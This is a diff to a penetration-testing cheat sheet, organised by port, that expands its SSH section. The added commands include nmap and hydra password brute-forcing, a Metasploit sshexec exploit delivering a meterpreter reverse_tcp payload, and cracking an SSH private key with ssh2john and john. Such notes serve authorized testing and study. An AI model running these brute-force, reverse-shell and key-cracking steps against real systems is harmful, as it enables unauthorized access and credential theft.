@@ -32,6 +32,7 @@
      ```bash
      cat nullbyte.txt | awk '/Up$/{print $2}' | cat >> targetIP.txt
      ````
+
 #### Scaning live hosts in subnet and saving only up and runging hosts
 
 ```bash
@@ -65,20 +66,6 @@ sudo nmap -sVC -p- -vvv -iL nmap192Livehosts.txt -T4 | grep -iE "Discovered open
     # For tftp
     smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t 10.11.1.111
 
-## port 22 (ssh)
-### Nmape commands
-```bash
-    nmap -p 22 -n -v -sV  -sC -Pn --script ssh-auth-methods --script-args ssh.user=root 192.168.1.10
-    nmap -p 22 -n -v -sV -Pn --script ssh-hostkey 192.168.1.10 
-    nmap -p 22 -n -v -sV -Pn --script ssh-brute --script-args userdb=user_list.txt,passdb=password_list.txt 192.168.1.10
-    nmap -p 22 --script ssh* -oA ssh_scan <ip>
-    ssh-vulnkey <ip> key.pub
-    ssh-keyscan <ip>
-    ssh user@IP
-    ssh -i id_rsa user@IPHERE 
-```
-
-
 ### Metasploit Modules for FTP service;
     auxiliary/scanner/ftp/anonymous
     auxiliary/scanner/ftp/ftp_login
@@ -89,8 +76,73 @@ sudo nmap -sVC -p- -vvv -iL nmap192Livehosts.txt -T4 | grep -iE "Discovered open
 
     wget -m ftp://anonymous:1223@10.10.223.246
     wget -r ftp://anonymous:1223@10.10.223.246
-    
-  ## port 23 (TELNET)
+
+
+## port 22 (ssh)
+### Nmape & brute commands
+```bash
+    nmap -sV 192.168.31.205
+    nmap -p 22 -n -v -sV  -sC -Pn --script ssh-auth-methods --script-args ssh.user=root 192.168.1.10
+    nmap -p 22 -n -v -sV -Pn --script ssh-hostkey 192.168.1.10 
+    nmap --script ssh-brute -p 22 192.168.31.205
+    nmap -p 22 -n -v -sV -Pn --script ssh-brute --script-args userdb=user_list.txt,passdb=password_list.txt 192.168.1.10
+    nmap -p 22 --script ssh* -oA ssh_scan <ip>
+    ssh-vulnkey <ip> key.pub
+    ssh-keyscan <ip>
+    ssh user@IP
+    ssh -i id_rsa user@IPHERE 
+    hydra -L users.txt -P pass.txt 192.168.31.205 ssh 
+    hydra -L users.txt -P pass.txt 192.168.31.205 ssh -s 2222 # -s specify port to be tested.
+    ssh pentest@192.168.31.205
+    ssh pentest@192.168.31.205 'ifconfig' # Running Commands in remote hosts
+    nmap --script ssh-auth-methods --script-args="ssh.user=pentest" -p 22 192.168.31.205 # Test the auth method used in SSH
+```
+
+### Metasploit password based authentication Commands
+
+```bash
+    use exploit/multi/ssh/sshexec
+    set rhosts 192.168.31.205
+    set payload linux/x86/meterpreter/reverse_tcp
+    set username pentest
+    set password 123
+    show targets
+    set target 1
+    exploit
+```
+
+### Key based authentication (Metasploit)
+```bash
+use auxiliary/scanner/ssh/ssh_login_pubkey
+set rhosts 192.168.31.205
+set key_path /root/Downloads/ssh/id_rsa
+set key_pass 123
+set username pentest
+exploit
+```
+
+### Key based authentication
+
+```bash
+    - SSH key-based authentication offers a secure and user-friendly method for accessing remote servers without relying on passwords. This technique employs a pair of cryptographic keys: a private key stored on your local device and a public key saved on the remote server.
+    - The public and private key pair can be generated using the `ssh-keygen`
+    - Stored by default in,  `/home/user/.ssh/id_rsa`
+    - public key `id_rsa.pub` is copied to  `authorized_keys`
+    - Give appropriete permission to key `chmod 600 id_rsa`
+```
+
+#### Login and cracking key password
+
+```bash
+    ssh -i id_rsa pentest@192.168.31.205
+    ssh2john id_rsa > sshhash
+    john --wordlist=/usr/share/wordlists/rockyou.txt sshhash
+```
+- Ref [Hacking article - PORT 22](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)
+
+
+## port 23 (TELNET)
+
   ### Nmap commands
     nmap -n -sV -Pn --script "*telnet* and safe" -p 23 <ip>
    ###  Getting telnet passwd
